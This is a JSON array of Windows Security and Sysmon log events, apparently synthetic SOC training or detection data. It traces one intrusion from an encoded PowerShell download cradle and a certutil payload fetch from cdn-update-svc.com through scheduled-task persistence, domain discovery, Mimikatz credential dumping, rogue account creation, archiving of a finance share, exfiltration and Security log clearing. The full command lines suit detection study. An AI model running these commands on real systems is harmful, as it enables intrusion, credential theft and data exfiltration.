[
  {
    "_time": "2026-08-19T09:15:41.000Z",
    "sourcetype": "WinEventLog:Security",
    "source": "WinEventLog:Security",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "4688",
    "Account_Name": "CORP\\jlopez",
    "Account_Domain": "CORP",
    "New_Process_Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "New_Process_ID": "0x1a4c",
    "Creator_Process_Name": "C:\\Windows\\explorer.exe",
    "Creator_Process_ID": "0x0e10",
    "Process_Command_Line": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQAtAHMAdgBjAC4AYwBvAG0ALwBhAC4AcABzADEAJwApAA==",
    "Mandatory_Label": "Medium",
    "_raw": "08/19/2026 09:15:41 AM LogName=Security EventCode=4688 A new process has been created."
  },
  {
    "_time": "2026-08-19T09:15:42.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "1",
    "User": "CORP\\jlopez",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAp",
    "ProcessId": "6732",
    "ParentProcessId": "3600",
    "Hashes": "SHA256=9f4f1a8b3c5d7e2f0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f6071,MD5=c1d2e3f405162738495a6b7c8d9e0f10",
    "_raw": "Sysmon EventID 1 Process Create powershell.exe"
  },
  {
    "_time": "2026-08-19T09:16:03.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "3",
    "User": "CORP\\jlopez",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "SourceIp": "10.4.2.11",
    "SourcePort": "51022",
    "DestinationIp": "45.132.88.17",
    "DestinationPort": "443",
    "DestinationHostname": "cdn-update-svc.com",
    "Protocol": "tcp",
    "_raw": "Sysmon EventID 3 Network connection detected"
  },
  {
    "_time": "2026-08-19T09:16:20.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "1",
    "User": "CORP\\jlopez",
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "certutil.exe -urlcache -split -f https://cdn-update-svc.com/upd.exe C:\\Users\\jlopez\\AppData\\Local\\Temp\\upd.exe",
    "ProcessId": "7104",
    "ParentProcessId": "6732",
    "_raw": "Sysmon EventID 1 Process Create certutil.exe"
  },
  {
    "_time": "2026-08-19T09:16:24.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "11",
    "User": "CORP\\jlopez",
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "TargetFilename": "C:\\Users\\jlopez\\AppData\\Local\\Temp\\upd.exe",
    "Hashes": "SHA256=a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
    "_raw": "Sysmon EventID 11 File created"
  },
  {
    "_time": "2026-08-19T09:17:05.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "1",
    "User": "CORP\\jlopez",
    "Image": "C:\\Users\\jlopez\\AppData\\Local\\Temp\\upd.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "C:\\Users\\jlopez\\AppData\\Local\\Temp\\upd.exe",
    "ProcessId": "7420",
    "ParentProcessId": "6732",
    "Hashes": "SHA256=a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
    "_raw": "Sysmon EventID 1 Process Create upd.exe"
  },
  {
    "_time": "2026-08-19T09:18:11.000Z",
    "sourcetype": "WinEventLog:Security",
    "source": "WinEventLog:Security",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "4688",
    "Account_Name": "CORP\\jlopez",
    "Account_Domain": "CORP",
    "New_Process_Name": "C:\\Windows\\System32\\schtasks.exe",
    "Creator_Process_Name": "C:\\Users\\jlopez\\AppData\\Local\\Temp\\upd.exe",
    "Process_Command_Line": "schtasks.exe /create /tn \"MicrosoftEdgeUpdateTaskCore\" /tr C:\\Users\\jlopez\\AppData\\Local\\Temp\\upd.exe /sc onlogon /rl highest",
    "_raw": "08/19/2026 09:18:11 AM EventCode=4688 schtasks.exe"
  },
  {
    "_time": "2026-08-19T09:22:40.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "1",
    "User": "CORP\\jlopez",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ParentImage": "C:\\Users\\jlopez\\AppData\\Local\\Temp\\upd.exe",
    "CommandLine": "cmd.exe /c net group \"Domain Admins\" /domain & nltest /dclist:corp.local",
    "ProcessId": "7802",
    "ParentProcessId": "7420",
    "_raw": "Sysmon EventID 1 Process Create cmd.exe discovery"
  },
  {
    "_time": "2026-08-19T09:24:02.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "22",
    "Image": "C:\\Users\\jlopez\\AppData\\Local\\Temp\\upd.exe",
    "QueryName": "cdn-update-svc.com",
    "QueryResults": "type:  5 45.132.88.17;",
    "_raw": "Sysmon EventID 22 DNS query"
  },
  {
    "_time": "2026-08-19T09:35:12.000Z",
    "sourcetype": "WinEventLog:Security",
    "source": "WinEventLog:Security",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "4625",
    "Account_Name": "administrator",
    "Account_Domain": "CORP",
    "Logon_Type": "3",
    "Source_Network_Address": "10.4.2.11",
    "Workstation_Name": "WKS-0421",
    "Failure_Reason": "Unknown user name or bad password",
    "_raw": "08/19/2026 09:35:12 AM EventCode=4625 An account failed to log on."
  },
  {
    "_time": "2026-08-19T09:35:14.000Z",
    "sourcetype": "WinEventLog:Security",
    "source": "WinEventLog:Security",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "4625",
    "Account_Name": "administrator",
    "Account_Domain": "CORP",
    "Logon_Type": "3",
    "Source_Network_Address": "10.4.2.11",
    "Workstation_Name": "WKS-0421",
    "Failure_Reason": "Unknown user name or bad password",
    "_raw": "08/19/2026 09:35:14 AM EventCode=4625 An account failed to log on."
  },
  {
    "_time": "2026-08-19T09:35:19.000Z",
    "sourcetype": "WinEventLog:Security",
    "source": "WinEventLog:Security",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "4625",
    "Account_Name": "svc_backup",
    "Account_Domain": "CORP",
    "Logon_Type": "3",
    "Source_Network_Address": "10.4.2.11",
    "Workstation_Name": "WKS-0421",
    "Failure_Reason": "Unknown user name or bad password",
    "_raw": "08/19/2026 09:35:19 AM EventCode=4625 An account failed to log on."
  },
  {
    "_time": "2026-08-19T09:35:27.000Z",
    "sourcetype": "WinEventLog:Security",
    "source": "WinEventLog:Security",
    "host": "SRV-FS02",
    "ComputerName": "SRV-FS02.corp.local",
    "EventCode": "4625",
    "Account_Name": "administrator",
    "Account_Domain": "CORP",
    "Logon_Type": "3",
    "Source_Network_Address": "10.4.2.11",
    "Workstation_Name": "WKS-0421",
    "_raw": "08/19/2026 09:35:27 AM EventCode=4625 An account failed to log on."
  },
  {
    "_time": "2026-08-19T09:40:55.000Z",
    "sourcetype": "WinEventLog:Security",
    "source": "WinEventLog:Security",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "4624",
    "Account_Name": "CORP\\jlopez",
    "Account_Domain": "CORP",
    "Logon_Type": "3",
    "Source_Network_Address": "10.4.2.11",
    "Workstation_Name": "WKS-0421",
    "Logon_ID": "0x3e7a91",
    "_raw": "08/19/2026 09:40:55 AM EventCode=4624 An account was successfully logged on."
  },
  {
    "_time": "2026-08-19T09:41:30.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "11",
    "User": "CORP\\jlopez",
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "TargetFilename": "C:\\Windows\\Temp\\m.exe",
    "Hashes": "SHA256=b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90a1",
    "_raw": "Sysmon EventID 11 File created m.exe"
  },
  {
    "_time": "2026-08-19T09:42:10.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "1",
    "User": "CORP\\jlopez",
    "Image": "C:\\Windows\\Temp\\m.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "CommandLine": "m.exe \"sekurlsa::logonpasswords\" exit",
    "ProcessId": "4188",
    "ParentProcessId": "712",
    "Hashes": "SHA256=b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90a1",
    "_raw": "Sysmon EventID 1 Process Create m.exe credential dumping"
  },
  {
    "_time": "2026-08-19T09:44:18.000Z",
    "sourcetype": "WinEventLog:Security",
    "source": "WinEventLog:Security",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "4720",
    "Account_Name": "CORP\\jlopez",
    "New_Account_Name": "svc_helpdesk",
    "Account_Domain": "CORP",
    "_raw": "08/19/2026 09:44:18 AM EventCode=4720 A user account was created."
  },
  {
    "_time": "2026-08-19T09:47:02.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "1",
    "User": "CORP\\jlopez",
    "Image": "C:\\Program Files\\7-Zip\\7z.exe",
    "ParentImage": "C:\\Windows\\Temp\\m.exe",
    "CommandLine": "7z.exe a -p3xf1l C:\\Windows\\Temp\\arch.7z \\\\SRV-FS02\\finanzas\\*",
    "ProcessId": "5220",
    "ParentProcessId": "4188",
    "_raw": "Sysmon EventID 1 Process Create 7z.exe collection"
  },
  {
    "_time": "2026-08-19T09:52:44.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "3",
    "User": "CORP\\jlopez",
    "Image": "C:\\Windows\\Temp\\m.exe",
    "SourceIp": "10.4.1.5",
    "SourcePort": "49877",
    "DestinationIp": "45.132.88.17",
    "DestinationPort": "443",
    "DestinationHostname": "cdn-update-svc.com",
    "Protocol": "tcp",
    "_raw": "Sysmon EventID 3 Network connection detected exfil"
  },
  {
    "_time": "2026-08-19T08:58:12.000Z",
    "sourcetype": "WinEventLog:Security",
    "source": "WinEventLog:Security",
    "host": "WKS-0421",
    "ComputerName": "WKS-0421.corp.local",
    "EventCode": "4624",
    "Account_Name": "CORP\\jlopez",
    "Account_Domain": "CORP",
    "Logon_Type": "2",
    "Logon_ID": "0x2a11f0",
    "_raw": "08/19/2026 08:58:12 AM EventCode=4624 Interactive logon."
  },
  {
    "_time": "2026-08-19T09:55:31.000Z",
    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
    "source": "Sysmon",
    "host": "SRV-DC01",
    "ComputerName": "SRV-DC01.corp.local",
    "EventCode": "1",
    "User": "CORP\\jlopez",
    "Image": "C:\\Windows\\System32\\wevtutil.exe",
    "ParentImage": "C:\\Windows\\Temp\\m.exe",
    "CommandLine": "wevtutil.exe cl Security",
    "ProcessId": "6001",
    "ParentProcessId": "4188",
    "_raw": "Sysmon EventID 1 Process Create wevtutil clear log"
  }
]
